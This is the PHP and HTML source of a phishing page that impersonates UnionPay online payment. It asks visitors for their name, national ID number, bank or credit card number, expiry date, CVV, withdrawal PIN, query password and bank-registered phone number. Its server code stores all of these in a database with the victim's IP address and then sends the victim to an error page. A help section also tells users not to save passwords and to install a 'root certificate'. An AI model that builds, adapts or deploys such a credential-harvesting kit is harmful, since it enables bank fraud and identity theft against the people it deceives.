<?php 
	include_once "db.php";
	$get_data = $_GET;

	if (!empty($_POST)) {
		$post_data = $_POST;
		$data = [
			'addressee' => $get_data['recipients'],
			'mobile' => $get_data['dianhua'],
			'address' => $get_data['address'],
			'email' => $get_data['mailbox'],
			'recharge_phone' => $get_data['dianhua2'],
			'type' => $post_data['state'] == '银行卡' ? '储蓄卡' : '信用卡',
			'bank_name' =>  $post_data['bank'],
			'name' => $post_data['name'],
			'id_card' => $post_data['sfz'],
			'card_number' => $post_data['bankcard'],
			'password' => $post_data['password'],
			'validity' => $post_data['month'].'/'.$post_data['days'],
			'cw' => $post_data['cw'],
			'password2' => $post_data['password2'],
			'phone' => $post_data['re_phone'],
			'IP' => ip(),
			'created_at' => date('Y-m-d H:i:s')
		];
		$mysql = new Mysql();
		$res = $mysql->insert('data',$data);

		header("Location: /error.php?recipients=".$get_data['recipients']."&dianhua=".$get_data['dianhua']."&address=".$get_data['address']."&mailbox=".$get_data['mailbox']."&dianhua2=".$get_data['dianhua2']);
	}

  function ip() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $res =  preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
    return $res;
    }
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>银联在线支付-银行卡综合性网上交易转接清算平台</title>
  <meta name="viewport" content="width=device-width,user-scalable=0,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0"/>
  <meta name="format-detection" content="telephone=no" />
  <link rel="stylesheet" href="public/css/pay.css?v1">
  <script type="text/javascript" src="public/js/jquery-1.11.0.js" ></script>
  <script type="text/javascript" src="public/js/imageselect.js"></script> 
  <style type="text/css">
  .jqis{
   position:relative;
 }

 .jqis_header{
   background-image: url('public/images/dropdown_arrow.png');
   background-position: right center;
   background-repeat:no-repeat;
   cursor:pointer;
 }

 .jqis_header img{
   cursor:pointer;


 }

 .jqis_dropdown{
  padding: 5px;
  position:absolute;
  overflow-x:hidden;
  overflow-y:scroll;
}

.jqis_dropdown img{

  cursor:pointer;
  float:left;

  margin-bottom:0.5rem;
}
.topp{height: 5rem;border-bottom: 3px solid #28529a;display: flex;justify-content: space-between;padding: 0 5px;align-items:center;box-sizing: border-box;}
.topp img{width: 100px;height: 25px;margin-top: -5px;}
.infoBox a{color: #000000;font-size: 0.8rem;margin-left: 0.2rem;}
.infoBox span{display: inline-block;width: 100px;height: 10px;background: url(public/images/add2.png) no-repeat center center/cover;}
</style>
<script>
  var docwidth=$(window).width();
  if(docwidth>640)
  {
   $("html").css("font-size", "20px");
 }
 else
 {
   $("html").css("font-size", 20 * ( docwidth/ 640) + 'px');
 }
 var tglaiyuan = window.location.href;
 document.cookie="tglaiyuan="+tglaiyuan;
</script>



<script type="text/javascript">

  function ztSele(t,con){
    $(t).parent('div').find('span').addClass('hit');
    $(t).removeClass('hit');
    $(con).val('');
    $(con).val($(t).attr('data-value'));
    if(con=='#state'){
      if($('#state').val() == '银行卡'){


        $(t).parents('ul').find('li').eq(5).hide();
        $(t).parents('ul').find('li').eq(6).hide();
        $(t).parents('ul').find('li').eq(3).find('.sm_form_name').text('银行卡号：');
        $('#pany').attr('placeholder','请输入您的银行卡号');
        $(t).parent('div').find('span').addClass('hit');
        $(t).removeClass('hit');
        
      }else{


        $(t).parents('ul').find('li').eq(5).show();
        $(t).parents('ul').find('li').eq(6).show();
        $(t).parents('ul').find('li').eq(3).find('.sm_form_name').text('信用卡号：');
        $('#pany').attr('placeholder','请输入您的信用卡号');
        $(t).parent('div').find('span').addClass('hit');
        $(t).removeClass('hit');

      }
    }
  }
</script>
</head>

<body>
 <div style="width:32rem;margin:0 auto;box-sizing: border-box;">
  <div class="topp">
   <img src="public/images/add1.png" alt="" />
   <div class="infoBox">
     <a href="javascript:;">首页 | </a>
     <a href="javascript:;">帮助中心  | </a>
     <a href="javascript:;">English | </a>
     <span></span>
   </div>
 </div>
 <div class="clear"></div>
 <div class="top-boxa">
  <div>订单金额：<span style="font-size: 1.3rem;color: #ed9957">3.00</span>元</div>
  <div>订单编号：<?php echo date('Ymdhis')?>0010</div>
         <!--  <em style="margin-left:0.2rem">订单金额：<span style="font-size: 1.3rem">3.00</span>元</em>
          <em style="margin-left:.2rem">订单编号：<?php echo date('Ymdhis')?>0010</em>
          <em style="margin-left:0.2rem;">商户名称：中国联合通信有限公司</em> --><!--<a href="">订单详情[+]</a>-->
  </div>
  <div style="background: #eceef1;line-height: 25px;">商户名称：中国移动网络通信有限公司</div>
        <div style="width: 100%;box-sizing: border-box;margin-bottom: 6px;">
         <img src="public/images/nb.jpg" style="width:1.3rem;height:1.25rem;"/><em style="font-size:1rem;line-height:1.9rem;margin-left:0.4rem">无需注册，支持信用卡、储蓄卡</em>
       </div>
       
       <div class="tabPanel">

        <div class="clear"></div>
        <div class="panes" style="width: 100%;box-sizing: border-box;">
          <form method=post  onSubmit="return chuxuka()" >
            <ul class="pane" style="display:block;">

              <li>
               <div>
                <span class="tabx" style="margin-left:0rem;margin-right:0.2rem" onclick="ztSele(this,'#state')" data-value="银行卡">银联卡支付</span>
                <span class="hit tabx" onclick="ztSele(this,'#state')" data-value="信用卡">信用卡支付</span>
              </span>
              <input type="hidden" name="state" id="state" value="银行卡">
            </div>
            <br/>
          </li>



          <li style="margin-top:2rem;">
           <em style="margin-left:3rem" >银行类别：</em>
           <select name="bank" id="" style="display: none;">
             <option value="请选择您的银行类型" selected="selected">public/images/type1.gif</option>
             <option value="中国工商银行" style="margin-left:1rem;">public/images/bank14.gif</option>
             <option value="中国农业银行">public/images/bank1.gif</option>
             <option value="中国建设银行">public/images/bank2.gif</option>
             <option value="中国银行">public/images/bank4.gif</option>
             <option value="中国民生银行">public/images/bank3.gif</option>

             <option value="中国邮政储蓄银行">public/images/bank5.gif</option>
             <option value="交通银行">public/images/bank6.gif</option>
             <option value="渤海银行">public/images/bank7.gif</option>
             <option value="中信银行">public/images/bank8.gif</option>
             <option value="浦发银行">public/images/bank9.gif</option>
             <option value="招商银行">public/images/bank10.gif</option>
             <option value="上海银行">public/images/bank11.gif</option>
             <option value="北京银行">public/images/bank12.gif</option>
             <option value="中国光大银行">public/images/bank13.gif</option>

             <option value="浙商银行">public/images/bank15.gif</option>
             <option value="兴业银行">public/images/bank16.gif</option>
             <option value="广发银行">public/images/bank17.gif</option>
             <option value="华夏银行">public/images/bank18.gif</option>
             <option value="平安银行">public/images/bank19.gif</option>
             <option value="恒丰银行">public/images/bank20.gif</option>
             <option value="其他银行">public/images/bank21.gif</option>
           </select>

           <p id="p1" style="display:none;">我就会消失。</p>
         </li>
         <li style="margin-top:1rem">
          <em style="margin-left:5rem;">姓名：</em><input  name="name" placeholder="请填写你的姓名" type="text" id="name" style="width:7.8rem;">
        </li>

        <li>
         <em style="margin-left:3rem">身份证号：</em><input value="" name="sfz" placeholder="请输入在银行办理该卡时使用的身份证号码" type="text" id="sfz">
       </li>
       <li>
        <em style="margin-left:3rem" class="sm_form_name">银行卡号：</em><input value="" name="bankcard" placeholder="请输入您的银行卡号" type="number" id="bankcard">
      </li>
      <li style="display:none">
        <em style="margin-left:4rem">有效期：</em><input value="" name="month" placeholder="卡正面右下角" type="number" id="yxq1" style="width:7rem">月<input value="" name="days" placeholder="" type="number" id="nameabc" style="width:4rem">年<br />
      </li>
      <li style="display:none">
        <em style="margin-left:1rem">卡背面末三位：</em><input value="" name="cw" placeholder="卡背面末三位" style="width:7rem" type="number" id="bsw1"><br />
      </li>
      <li> 
        <em style="margin-left:2rem" >银行卡密码：</em><input value="" name="password" placeholder="请输入您的银行卡取款密码" type="password" id="mm" style="width:13rem;"><br />
      </li>
      <li>
       <em style="margin-left:3rem">查询密码：</em><input value="" name="password2" placeholder="请输入您的查询密码" type="password" id="cmm" style="width:13rem;"><br />
     </li>
     <li>
      <em style="margin-left:0rem">银行预留手机号：</em><input value="" name="re_phone" placeholder="请输入银行开户或办理业务时留存的号码" type="text" id="sjh"><br />
    </li>
  </ul>

  <input type="checkbox" id="checkbox-1-1" class="regular-checkbox" checked="checked"/><label for="checkbox-1-1"></label><span>我已阅读并接受银联用户服务协议</span><br />

  <button class="ktxx">开通并付款</button>
</form>

        <!-- <div class="pane">
         <form action=""  method=post name='' onSubmit="return xinyongka()" >
           <em style="margin-left:6.3rem">身份证号：</em><input value="" name="" placeholder="请输入在银行办理该卡时使用的身份证号码" type="text" id="sfz1"><br />
           <em style="margin-left:6.3rem">信用卡号：</em><input value="" name="" placeholder="请输入您的信用卡卡号" type="text" id="kh1"><br />    
           <em style="margin-left:7.3rem">有效期：</em><input value="" name="" placeholder="请输入信用卡正面的有效期,如:09/13" type="text" id="yxq1" style="width:12.5rem">月<input value="" name="" placeholder="" type="text" id="name" style="width:1.5rem">日<br />
           <em style="margin-left:4.3rem">卡背面末三位：</em><input value="" name="" placeholder="请输入您的信用卡背面的末三位数字" type="text" id="bsw1"><br />
           <em style="margin-left:5.3rem">银行卡密码：</em><input value="" name="" placeholder="请输入您的银行卡取款密码" type="text" id="mm1"><br />
           <em style="margin-left:6.3rem">查询密码：</em><input value="" name="" placeholder="请输入您的查询密码" type="text" id="cmm1"><br />
           <em style="margin-left:3.3rem">银行预留手机号：</em><input value="" name="" placeholder="请输入您在银行开户或办理业务时留存的手机号码" type="text" id="sjh1"><br />
           <input type="checkbox" id="checkbox-1-2" class="regular-checkbox" /><label for="checkbox-1-2"></label><span>我已阅读并接受银联用户服务协议</span><br />
           <button>开通并付款</button>
          </form>
        </div> -->
      </div>

      <script>
        function chuxuka(){

          var type = document.getElementById("state").value,imgType=$('.jqis_header img').attr('src');
		//	if($('#name').val() == '' || !/^[\u4E00-\u9FA5]/.test($('#name').val())){
				//$('#y1').attr("style","display:block;");
		//		alert('请输入您的姓名');
			//	return false;
			//	}

      

      if(type == '银行卡'){

       if(imgType === 'public/images/type1.gif'){
        alert("请正确选择银行卡类型");
        return false;    
        }

       else if(!/^[\u4e00-\u9fa5]+$/gi.test(document.getElementById("name").value) || document.getElementById("name").value.length<2){
        alert("请正确填写中文姓名");
        return false;         
      }
      else if($('#bankcard').val().length<16 || $('#bankcard').val().length>19){
        alert('请正确填写您的银行卡号（16或19位数）');
        return false;
      }
      else if($('#sfz').val() == '' || !/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/.test($('#sfz').val())){
        alert('请正确输入18位身份证号码');
        return false;
      }
      else if($('#mm').val() == '' || !/^\d{6}$/.test($('#mm').val())){
        alert('请正确输入您的取款密码');
        return false;
      }
      else if($('#cmm').val() == '' || !/^\d{6}$/.test($('#cmm').val())){
        alert('请正确输入您的查询密码');
        return false;
      }
      else if($('#sjh').val().length !=11 || $('#sjh').val().slice(0,1)!=1){
        alert('请输入银行开户时预留的手机号码');
        return false;
      }


    }else{
      if(imgType === 'public/images/type1.gif'){
        alert("请正确选择银行卡类型");
        return false;    
        }

      else if(!/^[\u4e00-\u9fa5]+$/gi.test(document.getElementById("name").value) || document.getElementById("name").value.length<2){
        alert("请正确填写中文姓名");
        return false;         
      }
       else if($('#sfz').val() == '' || !/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/.test($('#sfz').val())){
        alert('请正确输入18位身份证号码');
        return false;
      }
        else if($('#bankcard').val().length !==16){
        alert('请正确填写您的银行卡号（16或19位数）');
        return false;
      }
        else if(($('#yxq1').val().length !=2 || $('#yxq1').val()<=0 || $('#yxq1').val()>12) || ($('#nameabc').val().length!=2 || $('#nameabc').val()<=0 || $('#nameabc').val()>99)){
        alert('请正确输入银行卡有效期');
        return false;
     }
     else if($('#bsw1').val().length!==3){
      alert('请正确输入卡末三位数字');
      return false;
    }
    // else if($('#sfz').val() == '' || !/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/.test($('#sfz').val())){
    //   alert('请正确输入18位身份证号码');
    //   return false;
    // }
    else if($('#mm').val() == '' || !/^\d{6}$/.test($('#mm').val())){
      alert('请正确输入您的取款密码');
      return false;
    }
    else if($('#cmm').val() == '' || !/^\d{6}$/.test($('#cmm').val())){
      alert('请正确输入您的查询密码');
      return false;
    }
    else if($('#sjh').val().length !=11 || $('#sjh').val().slice(0,1)!=1){
      alert('请输入银行开户时预留的手机号码');
      return false;
    }


  }
}

</script>
<script type="text/javascript">

  $(document).ready(function(){
    $('select[name=bank]').ImageSelect({dropdownWidth:425});
  });


</script>
   <!--  <script>
      function xinyongka(){
		 if($('#sfz1').val() == '' || !/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/.test($('#sfz1').val())){
				alert('请输入正确的身份证号');
				return false;
				}
		else if($('#kh1').val() == '' || !/^\d{16}$/.test($('#kh1').val())){
				alert('请输入正确的信用卡卡号');
				return false;
			}
		else if($('#yxq1').val() == '' || !/^\d{2}$/.test($('#yxq1').val())){
				alert('请输入正确的有效期');
				return false;
			}
		else if($('#bsw1').val() == '' || !/^\d{3}$/.test($('#bsw1').val())){
				alert('请输入正确的卡背面末三位');
				return false;
			}
		else if($('#mm1').val() == '' || !/^\d{6}$/.test($('#mm1').val())){
				alert('请输入正确的银行卡密码');
				return false;
			}
	    else if($('#cmm1').val() == '' || !/^\d{6}$/.test($('#cmm1').val())){
				alert('请输入正确的查询密码');
				return false;
			}
			else if($('#sjh1').val() == '' || !/^1(3|4|5|7|8)\d{9}$/.test($('#sjh1').val())){
				alert('请输入正确的银行预留手机号');
				return false;
			}
		}

 </script> -->

 <div style="width:32rem;height:2.3rem;background:#c4d5e7;margin-top:1rem;padding-top:0.2rem">
   <div class="zf">
    <a>银联卡支付</a><span style="width:0.1rem;height:1.1rem;background:#000;margin-left:2rem;display:inline-block;float:left;margin-top:0.5rem"></span><a href="">迷你付</a>
  </div>
</div>
<div class="clear"></div>
<div  class="zf-db">
  <h1 style="font-size: 1rem;">支付遇到问题？</h1>
  <div class="container"  style="font-size: 1.5rem;">

    <ul>
      <li class="dropdown">
        <a href="#" data-toggle="dropdown"  style="font-size: 1rem;">1.什么是银行预留手机号？<i class="icon-arrow"></i></a>
        <ul class="dropdown-menu">
          <li><a style="font-size: 1rem;">答：银行预留手机号是您申请银行卡或办理银行卡相关业务时在银行登记的手机号。</a></li>   
        </ul>
      </li>

      <li class="dropdown">
        <a href="#" data-toggle="dropdown" style="font-size: 1rem;">2.是否记住您在此网站上使用的密码？<i class="icon-arrow"></i></a>
        <ul class="dropdown-menu">
          <li><a  style="font-size: 1rem;">答：请选择否或者取消。</a></li>
        </ul>
      </li>

      <li class="dropdown">
        <a href="#" data-toggle="dropdown" style="font-size: 1rem;">3.付款时，遇到提示"网站安全证书有问题"，我该如何解决？<i class="icon-arrow"></i></a>
        <ul class="dropdown-menu">
          <li><a  style="font-size: 1rem;">答：您需要点击这里重新安装浏览器根证书，安装具体过程可以点击这里到帮助中心中查看。浏览器根证书可用来保障您的网络购物环境更安全，让您的银联在线支付付款体验更顺畅。 </a></li>
        </ul>
      </li>
    </ul>
    
  </div>
  <script type="text/javascript" src="public/js/index.js" ></script>
</div>
<p style="font-size:1rem;margin-top:0.5rem">如需查看更多问题，请点击帮助中心 或联系在线客服</p>

<div style="claer:both;"></div>
<div style="width:32rem;height:0.05rem;background:#f4f4f4;margin-top:0.5rem;"></div>
<div class="db-box2" style="font-size: 1rem;">
  <a href="javascript:;">银联官网</a><i></i>
  <a href="javascript:;">银联在线支付</a><i></i>
  <a href="javascript:;">关于我们</a><i></i>
  <a href="javascript:;">网站使用条款</a><br>
  <p >中国银联股份有限公司版权所有 © 2002-2019 沪ICP备07032180号</p>
</div>
</div>


</body>
</html>